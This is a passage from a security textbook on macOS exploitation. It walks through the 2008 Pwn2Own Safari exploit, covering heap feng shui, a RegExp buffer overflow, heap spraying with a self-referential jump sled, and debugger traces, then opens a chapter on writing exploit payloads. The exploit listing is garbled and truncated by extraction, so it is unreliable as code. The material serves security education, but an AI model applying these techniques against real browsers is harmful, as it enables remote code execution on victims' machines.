Chapter 8 ■ Exploiting Heap Overflows 207
function pointers. In particular, by accessing the Number object, say by print-
ing it, a function pointer will be called. It is necessary to preserve the format
of the array as in the preceding code example when overwriting this buffer,
(the dword 1 followed by 0 followed by a pointer to attacker-controlled data).
Otherwise the program will crash before the pointer is dereferenced. In sum-
mary, the following JavaScript code will dereference an overwritten pointer and
then call a function pointer from this address.
var name = new Array(1000);
name[0] = new Number(12345);
// Overflow “name” buffer here
document.write(name[0] + “”);
Case Study
Below is the full source to the exploit used in the Pwn2Own contest held at
CanSecWest 2008. We’ll walk through and demonstrate exactly how it works.
It uses ideas from feng shui as well as heap spraying.
Hi
var size=1000;
var bigdummy = new Array(1000);
function build_string(x){
var s = new String(“\u0278\u5278”);
var size = 4;
while(size ”);
st = st.concat(st, shellcode);
document.write(st.length + “”);
try{
for(i=0; i naptime){ sleeping = false; }
}
for(i=901; i”);
}
for(i=0; i”);
The fi rst few lines set up the valid HTML page. Next we defi ne the variable
bigdummy, which is an array of 1,000 entries. Then we defi ne a function called
build_string that creates a potentially very long string with the binary values
0x52780278 repeated over and over within it. This is used for the heap spray,
which will be discussed in the “Heap Spray” section. Next, we defi ne our shell-
code. In this case it is a simple port-bind shellcode that we got by making small
modifi cations to the BSD shellcode from Metasploit. Writing Mac OS X shellcode
will be covered in detail in Chapter 9. Next we create the actual heap spray by
calling the build_string function with a very large value.
Feng Shui Example
Now it is time to perform the feng shui. The “for” loop allocates 1,000 arrays
of size 1000 (which will be size 4008 in memory). The fi rst 900 of these alloca-
tions are used to defragment the heap. That is to say, there is a very good chance
that the fi nal 100 of these allocations will be adjacent. Next we free every other
one of the last 100 allocations to create holes that the buffer we plan to overfl ow
will fi ll.
Next some code attempts to sleep in an effort to force the garbage-collection
timer to expire. This code forces garbage collection not because the timer expires,
but rather because it allocates many Date objects as a side effect! The code from
the last section could be used in its place and would be more effi cient.
For the remaining allocations in the fi nal 100, we assign a Number object as
the fi rst element of that array. This means that when we overfl ow one of these
buffers (which will be the case since the holes we created are always followed
immediately by one of these allocations) we overfl ow something important.
Next we create a malicious RegExp object within a try/catch block. The try/
catch is necessary because the regular expression is (purposefully) invalid and
hence the remaining JavaScript will not be executed without this mechanism.
The character class [\x01\x59\x5c\x5e] used in the regular expression compiles
in memory to include the following 32 bytes:
0x00000002 0x00000000 0x52000000 0x00000000 0x00000000 0x00000000
0x00000000 0x00000000
This is what we use to overwrite the array structure. We use the hard-coded
address 0x52000000, so we must make sure we have data at that address. For
this we use a heap spray, as described in the next section.
9955336633cc0088..iinndddd 220099 11//2255//0099 44::4422::1100 PPMM
210 Part III ■ Exploitation
Next we access the overfl owed pointer value, which we now control. We’ll dis-
cuss in the next section how this gives us control. Then, to be safe, we set some
values in the fi rst 900 of the allocations to make sure they aren’t cleaned up with
an overzealous garbage collection. The remainder of the fi le is unimportant.
By using breakpoints in Safari where the mallocs are occurring, we can
observe the defragmenting of the heap. At the beginning, as the buffers are
being allocated, they occur at various spots in memory:
Breakpoint 3, 0x95850389 in KJS::ArrayInstance::ArrayInstance ()
array buffer at$1 = 0x16278c78
Breakpoint 3, 0x95850389 in KJS::ArrayInstance::ArrayInstance ()
array buffer at$2 = 0x50d000
Breakpoint 3, 0x95850389 in KJS::ArrayInstance::ArrayInstance ()
array buffer at$3 = 0x510000
Breakpoint 3, 0x95850389 in KJS::ArrayInstance::ArrayInstance ()
array buffer at$4 = 0x16155000
Breakpoint 3, 0x95850389 in KJS::ArrayInstance::ArrayInstance ()
array buffer at$5 = 0x1647b000
Breakpoint 3, 0x95850389 in KJS::ArrayInstance::ArrayInstance ()
array buffer at$6 = 0x1650f000
Breakpoint 3, 0x95850389 in KJS::ArrayInstance::ArrayInstance ()
array buffer at$7 = 0x5ac000
This shows how the heap can be unpredictable. By the end the buffers are all
occurring one after the other, as expected.
Breakpoint 3, 0x95850389 in KJS::ArrayInstance::ArrayInstance ()
array buffer at$997 = 0x17164000
Breakpoint 3, 0x95850389 in KJS::ArrayInstance::ArrayInstance ()
array buffer at$998 = 0x17165000
Breakpoint 3, 0x95850389 in KJS::ArrayInstance::ArrayInstance ()
array buffer at$999 = 0x17166000
Breakpoint 3, 0x95850389 in KJS::ArrayInstance::ArrayInstance ()
array buffer at$1000 = 0x17167000
Breakpoint 3, 0x95850389 in KJS::ArrayInstance::ArrayInstance ()
array buffer at$1001 = 0x17168000
Breakpoint 3, 0x95850389 in KJS::ArrayInstance::ArrayInstance ()
array buffer at$1002 = 0x17169000
9955336633cc0088..iinndddd 221100 11//2255//0099 44::4422::1100 PPMM
Chapter 8 ■ Exploiting Heap Overflows 211
Ahhh … it’s beautiful. After these mallocs, we go in and free every other one
of them to create holes for our regular-expression buffer that we will overfl ow.
Then, with the debugger, we watch as the regular-expression buffer ends up
in one of the holes we created.
Breakpoint 2, 0x95846748 in jsRegExpCompile ()
regex buffer at$1004 = 0x17168000
We fi nd the regular-expression buffer in the very last hole, where buffer 1001
used to be. The buffer right after this buffer is at 0x17169000 and contains data
we control.
Heap Spray
The previous section allowed us to overwrite a pointer with the value 0x52000000.
As we described earlier, we create a large array in memory fi lled with the dword
0x52780278. This slide can be made as large as we like, within the memory con-
straints of the target. The value of 0x52780278 was chosen carefully because it
possesses two important properties.
First, it is self-referential—that is, it points into itself. In this way, the value
can be dereferenced as many times as we would like and it will still be valid
and still point to the sled. Second, it is an x86 NOP equivalent. As instructions,
it becomes
78 02: js +0x2
78 52: js +0x52
These are conditional jumps. If the conditional happens to be true, we jump
over the longer of the two jumps and continue jumping in this fashion until
we hit the shellcode. If the condition is false, the jumps are not taken, so we
execute to the shellcode as well. Conditional jumps were necessary because
unconditional jumps (0xeb) would not be 4-byte-aligned when considered as
a pointer. The best part of this choice is that although the high-order byte of
the dword (0x52) is the most important, as far as the location where the sled is
expected as NOP instructions, this byte can be anything. Jake Honoroff made
this discovery.
Now, with our sled in place, the value 0x52000000 points to our sled. At some
offset from there, a function pointer is executed, which begins execution in the
sled and ends up in the shellcode. The only assumption that this exploit makes,
thanks to the feng shui, is that the address range from 0x52000000 to 0x52780278
contains only our sled. With a smarter choice of character class we could have
made only the assumption that the address 0x52780278 lies in the sled. Since the
heap is not randomized and we can choose to make as large a sled as possible,
this defect isn’t a major obstacle.
9955336633cc0088..iinndddd 221111 11//2255//0099 44::4422::1100 PPMM
212 Part III ■ Exploitation
References
Skylined. “Internet Explorer IFRAME src&name parameter BoF remote
compromise,” http://skypher.com/wiki/index.php?title=Www.edup
.tudelft.nl/~bjwever/advisory_iframe.html.php
Soitrov, Alex. “Heap Feng Shui in Javascript, BlackHat Europe 2007,”
http://www.blackhat.com/presentations/bh-europe-07/Sotirov/
Presentation/bh-eu-07-sotirov-apr19.pdf
Metasploit Project. Metasploit Shellcode, http://www.metasploit.com/
shellcode/
Anley, Heasman, Lindner, and Richarte. Shellcoder’s Handbook: Discovering
and Exploiting Security Holes (2nd Edition), Wiley 2007.
Hoglund and McGraw. Exploiting Software: How to Break Code, Addison
Wesley 2004.
Conover and Horovitz. Reliable Windows Heap Exploits, CanSecWest
2004.
Nemo, “OS X Heap Exploitation Techniques,” Phrack 63-5, http://www
.phrack.org/issues.html?issue=63&id=5
9955336633cc0088..iinndddd 221122 11//2255//0099 44::4422::1100 PPMM
CHAPTER
9
Exploit Payloads
In the exploit examples so far, you haven’t really done anything interesting after
you have obtained code execution. The executable payloads in your exploits
typically only issued a breakpoint trap to verify that you had obtained execu-
tion. In this chapter, you will see how to make your exploits do something
more interesting.
The executable code found in exploits has traditionally been called shellcode
because it typically executed an operating-system shell for the attacker. These
days, however, many exploit payloads are much more complicated, with their
own remote system call execution, library injection, or scripting languages. In
addition, on platforms such as the iPhone, there typically is no shell to execute.
For that reason, it makes more sense to refer to exploit payloads by that name and
use shellcode to refer to payloads the give a shell to the remote attacker.
In this chapter we will show how to write exploit payloads for Mac OS X on
both PowerPC and Intel x86, ranging from simple shellcode payloads for local
exploits to more complicated payloads for remote exploits that dynamically
execute arbitrary machine code fragments and inject Mach-O bundles into the
running process. This chapter is very heavy on PowerPC and x86 assembly as
well as low-level C code, so familiarity with these languages is important.
213
9955336633cc0099..iinndddd 221133 11//2255//0099 44::4422::2288 PPMM
214 Part III ■ Exploitation
Mac OS X Exploit Payload Development
Exploit payloads are standalone machine code fragments meant to be injected
into a running process and executed from within that process, just as a parasite
lives within its host. And because a parasite dies if the host dies, exploit pay-
loads must be careful to keep their host process running. This can be diffi cult
in some cases, as a successful exploit may overwrite large portions of the stack
or heap, corrupting critical runtime structures. This places certain constraints
on exploit payloads.
■ They must be written in completely position-independent code and
capable of executing from whatever memory address or segment they
are injected into.
■ They often have extreme size constraints due to the exploit injection
vector; they must be written as compactly as possible.
■ T he injection vector may place constraints on the byte values used in the
instruction encoding due to potential interpretation by the vulnerable
software; NULL bytes (and potentially others) must be avoided.
■ Unless they resolve shared library functions themselves, they may be
unable to use shared library functions, as they are not often found at
fi xed locations in memory.
Many tutorials on payload construction, including the canonical “Smashing
the Stack for Fun and Profi t,” demonstrate how to disassemble simple com-
piled programs to obtain the assembly code to construct standalone exploit
payloads. These days, however, compilers and linkers are getting increasingly
complicated, such that the output assembly code of even small, simple programs
includes enough system-specifi c stub code that it obscures how simple pay-
load assembly coding actually can be. For example, the compiler’s defi nition of
“position-independent code” differs from ours. While the compiler may assume
that the executing code has properly defi ned memory segments and permis-
sions, you do not have that luxury and can depend on far less being constant.
You may assume only that kernel system call numbers remain constant and that
the runtime linker dyld is always loaded at the same memory address. Luckily,
this makes writing assembly code much simpler. Writing exploit payloads by
hand requires knowledge of just enough assembly to be dangerous: a minimal
subset of the assembly language for a given architecture that includes only basic
register and memory operations, simple fl ow control, and direct execution of
common system calls.
We will demonstrate our various exploit payloads as a system of composable
individual components. This payload-development style was fi rst introduced
9955336633cc0099..iinndddd 221144 11//2255//0099 44::4422::2288 PPMM
Chapter 9 ■ Exploit Payloads 215
by the Last Stage of Delirium (LSD) Research Group. Each component will fi rst
be written as a standalone assembly program that can be assembled and run
natively with the GNU tool chain (gcc, as, and ld) for PowerPC, and NASM for
x86. This allows the developer to run the component from the command line
and debug it using the GNU debugger (GDB). After the components have been
tested in this fashion, they can be assembled into raw binary fi les that are more
suitable for use in exploits.
The Metasploit Framework is one of the most popular open-source penetra-
tion-testing tools and is a tremendously useful framework for exploit devel-
opment. It integrates many existing exploits, payloads, and payload encoders
for Windows, Linux, Solaris, and Mac OS X on PowerPC, x86, and ARM (for
the iPhone). The authors of this book have contributed a variety of exploits,
payloads, and techniques to this framework since its conception in 2003. The
payloads in this chapter are available from this book’s website and are ready
to use within the Metasploit Framework.
Before we get into the guts of specifi c exploit payloads, we need to describe
some specifi c aspects of payload development and execution on Mac OS X.
Restoring Privileges